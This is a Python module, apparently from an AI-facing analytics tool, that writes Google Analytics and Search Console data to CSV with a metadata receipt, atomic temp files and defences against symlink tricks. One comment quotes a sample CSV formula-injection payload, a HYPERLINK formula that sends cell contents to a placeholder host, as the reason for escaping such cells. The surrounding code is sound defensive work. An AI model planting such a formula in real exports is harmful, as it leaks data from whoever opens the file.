"""Write a dataset to CSV, with a receipt the conversation cannot lose.

The receipt goes back to the caller AND beside the file as .meta.json. The
first satisfies the agent; the second satisfies whoever opens the folder six
months later with no transcript. Both carry the fields most likely to make a
report confidently wrong if they went unstated: whether the response was
sampled, and whether it hit a row limit.
"""

import csv
import datetime
import json
import os
import re
import tempfile

import sessions


class ExportError(Exception):
    """Raised with a message intended to be read by a user, not a developer."""


# The preview exists to let the caller sanity-check the shape of the file, not
# to deliver its contents. It is capped rather than trusted because the caller
# is a language model reading a tool schema: preview_rows=3000 returns a ~29 KB
# receipt and duplicates those rows into the sidecar as well, defeating the one
# promise this module makes -- that a large result never passes through a
# context window.
MAX_PREVIEW_ROWS = 20


def _meta_path_for(path):
    return path[:-4] + ".meta.json" if path.endswith(".csv") else path + ".meta.json"


# The bytes go first to a temp file beside the destination, then os.replace
# moves it into place, so a failed write never leaves a half-written export.
#
# That temp file used to have a fixed name, `<destination>.ga-tmp`, opened
# with O_CREAT|O_EXCL (plus O_NOFOLLOW where it exists). This guard exists
# because on 2026-09-02 an agent redirected output through a symlink and
# truncated Homebrew's python3.14, breaking every MCP server on the machine.
# The old comment here said O_EXCL alone refused a symlink on every platform,
# "measured rather than assumed". That was true on POSIX and false on
# Windows: there, a DANGLING link planted at the fixed name was followed. The
# write created the link's target, full of report data, and os.replace moved
# the link itself into place as the user's export (#2011, windows-latest).
#
# So the name is no longer fixed. tempfile.mkstemp picks an unpredictable
# one and creates it exclusively, which leaves nothing to plant a link at
# ahead of time, on any platform. It also opens in binary mode on Windows,
# so the C runtime adds no newline translation of its own.
TEMP_SUFFIX = ".ga-tmp"

# mkstemp makes its file owner-only, and os.replace keeps that mode, so it is
# set explicitly: an export is an ordinary file the user may hand to anyone.
EXPORT_MODE = 0o644

# ...but filtered by the umask, as the old os.open(..., 0o644) was. A bare
# chmod is not, so under umask 077 exports would have gone from 0600 to
# readable by every account on the machine. Read once, at import, because
# os.umask can only be read by setting it, and setting it is process-wide:
# at import nothing else is running yet.
_UMASK = os.umask(0)
os.umask(_UMASK)


def _open_temp_beside(path):
    """Create a new, uniquely named temp file in `path`'s folder.

    Returns (fd, tmp_path). The folder is the destination's own so that
    os.replace stays within one filesystem and is atomic.
    """
    folder, name = os.path.split(path)
    try:
        return tempfile.mkstemp(dir=folder, prefix="." + name + ".",
                                suffix=TEMP_SUFFIX)
    except OSError as exc:
        raise ExportError(
            f"Could not create a temporary file beside {path} ({exc}). "
            "Nothing was written.")


def _discard(tmp):
    try:
        os.unlink(tmp)
    except OSError:
        pass


# Above this many rows, a result does not belong pasted into a chat reply.
# Michael's number, 2026-10-05. It governs only what is SHOWN -- never what is
# written. The file always gets every row.
CHAT_ROW_THRESHOLD = 2500


def next_step(meta, rows_written):
    """What the model should do with this export, or None if nothing.

    Analysts want complete data, and a model handed rows -- or a limit
    parameter -- will otherwise decide by itself what to cut. This is stated in
    the receipt because a tool's result is the one thing guaranteed to be read
    at the moment of decision; descriptions can be deferred and instructions
    dropped.

    The rule underneath the cut-off branches: cutoffs never touch the DATA, only
    what is shown in chat.
    """
    # Checked first: a file that repeats rows is wrong whatever else is true
    # of it, and every sum taken from it is inflated (#1993).
    repeats = meta.get("duplicate_rows") or 0
    if repeats > 0:
        return (f"REPEATED ROWS: {repeats:,} of the {rows_written:,} rows in "
                "this file repeat another row's full key, which a correct "
                "report never does, so its totals are inflated. Do not analyse "
                "this file. Tell the user, and report it as a bug.")
    reason = meta.get("incomplete_reason")
    matched = meta.get("rows_matched")
    capped = (reason == "caller_limit"
              or (reason is None and meta.get("row_limit_hit")
                  and meta.get("source") == "gsc_search_analytics"))
    if capped:
        of = f" of {matched:,}" if isinstance(matched, int) else ""
        return (f"CAPPED: this file holds {rows_written:,}{of} rows, because a "
                "limit was passed. Analysts want complete data -- unless the "
                "user asked for this cap, re-run without a limit before "
                "reporting anything from it.")
    if (reason == "server_stopped" or meta.get("stopped_reason")
            or meta.get("row_limit_hit")):
        of = f" of {matched:,}" if isinstance(matched, int) else ""
        return (f"INCOMPLETE: this file holds {rows_written:,}{of} rows; the "
                "source stopped before supplying every row. Say so plainly, "
                "and never present it as the whole result.")
    if rows_written > CHAT_ROW_THRESHOLD:
        return (f"Complete: all {rows_written:,} rows are in the file. That is "
                "more than belongs in a chat reply. Summarise from the file, or "
                "ask the user how they want it cut -- but never cut the data "
                "itself. The file keeps every row.")
    return None


# CSV formula injection (#159, 2026-10-25 audit). A spreadsheet treats a
# cell starting with one of these as a formula. Visitors control GA values
# (pagePath, pageTitle, searchTerm, event parameters; anyone can send hits
# with the public measurement ID) and searchers control Search Console
# queries, so =HYPERLINK("https://x/?"&A2, ...) in a page title would run
# when an analyst opens the export in Excel. OWASP's mitigation: prefix such
# cells with a single quote, which spreadsheets show as text.
FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
_PLAIN_NUMBER = re.compile(r"^[+-]?(\d+(\.\d*)?|\.\d+)([eE][+-]?\d+)?$")


def neutralize_cell(value):
    """value, or "'" + value when a spreadsheet would run it as a formula.

    Plain numbers are left alone, so a negative metric stays a number.
    """
    if (isinstance(value, str) and value.startswith(FORMULA_PREFIXES)
            and not _PLAIN_NUMBER.match(value)):
        return "'" + value
    return value


def neutralize_rows(rows):
    """(rows with formula-like cells neutralized, how many were changed)."""
    changed = 0
    out = []
    for row in rows:
        new = [neutralize_cell(v) for v in row]
        changed += sum(1 for a, b in zip(row, new) if a is not b)
        out.append(new)
    return out, changed


def write_export(path, columns, rows, meta, overwrite=False, preview_rows=5):
    """Write rows to `path` and its sidecar. Returns the receipt.

    `rows` must be a re-iterable sequence (a list), not a one-shot generator
    -- it is iterated three times here (length validation, preview slice,
    then the actual CSV write). A generator would validate cleanly and then
    silently write zero data rows on the second pass.
    """
    try:
        sessions.check_writable(path, overwrite=overwrite)
    except sessions.SessionError as exc:
        raise ExportError(str(exc))

    for i, row in enumerate(rows):
        if len(row) != len(columns):
            raise ExportError(
                f"Row {i} has {len(row)} values but there are "
                f"{len(columns)} columns ({', '.join(columns)}). Refusing to "
                "write a misaligned file.")

    rows, neutralized = neutralize_rows(rows)

    # next_step goes FIRST, so it is the first thing a model reads. #1 was
    # an agent reading straight past a row_count buried mid-payload.
    receipt = {"next_step": next_step(meta, len(rows))}
    receipt.update(meta)
    receipt.update({
        "path": path,
        "meta_path": _meta_path_for(path),
        "columns": list(columns),
        "row_count": len(rows),
        "retrieved_at": datetime.datetime.now().astimezone().isoformat(
            timespec="seconds"),
        "preview": [list(r) for r in
                    rows[:max(0, min(preview_rows, MAX_PREVIEW_ROWS))]],
        # Recorded so the transformation is visible, not silent.
        "formula_cells_neutralized": neutralized,
    })
    if neutralized:
        receipt["formula_note"] = (
            f"{neutralized} cell(s) began with = + - @ or a control "
            "character and were prefixed with ' so a spreadsheet shows them "
            "as text instead of running them. Strip a leading ' to recover "
            "the original value.")

    # encoding="utf-8" is explicit rather than relying on the interpreter's
    # default text encoding -- that default is UTF-8 here (Python 3.14's
    # UTF-8 mode), but is not guaranteed on every Python this module might
    # someday run under. Do not "simplify" this back out.
    fd, tmp = _open_temp_beside(path)
    try:
        with os.fdopen(fd, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(columns)
            writer.writerows(rows)
        os.chmod(tmp, EXPORT_MODE & ~_UMASK)
        os.replace(tmp, path)
    except Exception as exc:
        # Broad on purpose: anything that goes wrong while producing the CSV
        # -- an OSError from the filesystem, but also e.g. a TypeError from
        # something unwritable slipping into `rows` -- must still be
        # translated to ExportError and must still clean up the tmp file.
        # A narrower `except OSError` here previously let non-OSError
        # failures escape unwrapped and skip this cleanup.
        # tmp is ours: mkstemp created it, so removing it is always safe.
        _discard(tmp)
        raise ExportError(f"Could not write {path} ({exc}). Nothing was left "
                          "behind; re-running is safe.")

    meta_path = receipt["meta_path"]
    meta_fd, meta_tmp = _open_temp_beside(meta_path)
    try:
        with os.fdopen(meta_fd, "w", encoding="utf-8") as f:
            json.dump(receipt, f, indent=2)
            f.write("\n")
        os.chmod(meta_tmp, EXPORT_MODE & ~_UMASK)
        os.replace(meta_tmp, meta_path)
    except Exception as exc:
        # Broad for the same reason as above: a non-JSON-serialisable value
        # in `meta` (e.g. a datetime.date) raises TypeError here, not
        # OSError, and must still surface as ExportError rather than a raw
        # Python internals message. Written through a tmp file and
        # os.replace()'d, same as the CSV, so a failed json.dump() can't
        # leave a truncated, invalid-JSON sidecar sitting at meta_path --
        # the message below says the record is missing, so it must actually
        # be missing, not merely corrupt.
        _discard(meta_tmp)
        raise ExportError(
            f"Wrote {path} but could not write its sidecar "
            f"{meta_path} ({exc}). The data is intact; the "
            "provenance record is missing.")

    return receipt
